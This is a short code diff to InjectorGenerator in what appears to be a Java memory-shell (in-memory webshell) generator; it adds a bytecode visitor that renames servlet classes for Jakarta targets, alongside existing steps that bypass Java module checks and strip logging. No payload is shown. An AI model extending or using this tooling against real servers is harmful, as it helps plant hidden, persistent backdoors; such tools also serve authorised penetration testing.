@@ -2,6 +2,7 @@ package com.reajason.javaweb.memshell;
 
 import com.reajason.javaweb.buddy.ByPassJavaModuleInterceptor;
 import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
+import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
 import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
 import com.reajason.javaweb.config.InjectorConfig;
 import com.reajason.javaweb.config.ShellConfig;
@@ -45,6 +46,10 @@ public class InjectorGenerator {
 
         if (config.needByPassJavaModule()) {
             builder = ByPassJavaModuleInterceptor.extend(builder);
+        }
+
+        if(config.isJakarta()){
+            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
         }
 
         if (config.isDebugOff()) {
